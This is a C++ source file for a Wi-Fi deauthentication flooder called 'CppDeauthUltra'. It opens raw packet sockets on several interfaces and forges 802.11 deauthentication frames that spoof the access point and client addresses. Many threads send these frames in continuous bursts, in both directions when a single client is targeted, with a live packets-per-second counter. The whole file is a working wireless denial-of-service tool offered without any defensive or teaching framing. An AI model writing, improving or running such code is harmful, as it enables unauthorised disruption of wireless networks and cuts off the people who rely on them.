#include "cpp_deauth_ultra.h"
#include <cstdio>
#include <cstring>
#include <chrono>
#include <unistd.h>
#include <sys/socket.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <linux/if_packet.h>
#include <netinet/in.h>
#include <net/ethernet.h>

#undef ifr_name

CppDeauthUltra::CppDeauthUltra(const std::string& bssid, const std::string& station, uint16_t reason)
    : reason_(reason) {
    auto parse = [](const std::string& mac, uint8_t* out) {
        unsigned int b[6];
        if (std::sscanf(mac.c_str(), "%02x:%02x:%02x:%02x:%02x:%02x",
                        &b[0],&b[1],&b[2],&b[3],&b[4],&b[5]) == 6)
            for (int i=0;i<6;i++) out[i] = (uint8_t)b[i];
    };
    parse(bssid, bssid_);
    if (station != "FF:FF:FF:FF:FF:FF")
        parse(station, station_);
    else
        std::memset(station_, 0xFF, 6);
    targeted_ = std::memcmp(station_, "\xff\xff\xff\xff\xff\xff", 6) != 0;
}

CppDeauthUltra::~CppDeauthUltra() { stop(); }

int CppDeauthUltra::open_socket(const std::string& iface) {
    struct sockaddr_ll sll;
    int fd = ::socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (fd < 0) return -1;
    struct ifreq ifr;
    std::memset(&ifr, 0, sizeof(ifr));
    std::strncpy(ifr.ifr_ifrn.ifrn_name, iface.c_str(), IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) { ::close(fd); return -1; }
    std::memset(&sll, 0, sizeof(sll));
    sll.sll_family = AF_PACKET;
    sll.sll_ifindex = ifr.ifr_ifindex;
    sll.sll_protocol = htons(ETH_P_ALL);
    if (::bind(fd, (struct sockaddr*)&sll, sizeof(sll)) < 0) { ::close(fd); return -1; }
    return fd;
}

void CppDeauthUltra::add_interface(const std::string& iface, int weight) {
    int fd = open_socket(iface);
    if (fd >= 0) ifaces_.push_back({iface, fd, weight});
}

void CppDeauthUltra::build_frame(uint8_t* buf, const uint8_t* bssid,
                                  const uint8_t* station, uint16_t reason, uint16_t seq) {
    std::memset(buf, 0, 38);
    buf[0]=0x00; buf[1]=0x00; buf[2]=0x0C; buf[3]=0x00;
    buf[4]=0x02; buf[5]=0x00; buf[6]=0x00; buf[7]=0x00;
    buf[8]=0x00;
    buf[12]=0xC0; buf[13]=0x00;
    buf[14]=0x3A; buf[15]=0x01;
    std::memcpy(&buf[16], station, 6);
    std::memcpy(&buf[22], bssid, 6);
    std::memcpy(&buf[28], bssid, 6);
    buf[34]=(uint8_t)((seq<<4)&0xFF);
    buf[35]=(uint8_t)(((seq<<4)>>8)&0xFF);
    buf[36]=(uint8_t)(reason&0xFF);
    buf[37]=(uint8_t)((reason>>8)&0xFF);
}

double CppDeauthUltra::pps() const {
    auto now = std::chrono::steady_clock::now();
    (void)now;
    return 0.0;
}

void CppDeauthUltra::worker(int fd, int weight) {
    int burst = 128 * weight;
    uint16_t seq = 0;

    while (running_) {
        for (int i = 0; i < burst && running_; i++) {
            uint8_t frame[38];
            build_frame(frame, bssid_, station_, reason_, seq);
            seq = (seq + 1) & 0xFFF;
            if (::send(fd, frame, 38, 0) > 0) {
                total_++;
                pps_count_++;
            }

            if (targeted_) {
                build_frame(frame, station_, bssid_, reason_, seq);
                seq = (seq + 1) & 0xFFF;
                if (::send(fd, frame, 38, 0) > 0) {
                    total_++;
                    pps_count_++;
                }
            }
        }
    }
}

void CppDeauthUltra::start(int threads) {
    if (running_.exchange(true)) return;
    if (ifaces_.empty()) return;

    for (auto& iface : ifaces_) {
        for (int t = 0; t < threads; t++) {
            workers_.emplace_back(&CppDeauthUltra::worker, this, iface.fd, iface.weight);
        }
    }

    std::fprintf(stderr, "[C++-v2] Deauth ULTRA: %zu ifaces, %zu threads\n",
                 ifaces_.size(), workers_.size());

    std::thread monitor([this]() {
        auto start = std::chrono::steady_clock::now();
        while (running_) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
            auto now = std::chrono::steady_clock::now();
            double secs = std::chrono::duration<double>(now - start).count();
            long long cnt = total_.load();
            pps_count_ = 0;
            std::fprintf(stderr, "\r[C++-v2] ULTRA: %lld total (%.0f pps)      ", cnt, secs > 0 ? cnt/secs : 0);
        }
    });
    monitor.detach();
}

void CppDeauthUltra::stop() {
    running_ = false;
    for (auto& w : workers_) if (w.joinable()) w.join();
    workers_.clear();
    for (auto& iface : ifaces_) if (iface.fd >= 0) ::close(iface.fd);
    ifaces_.clear();
}
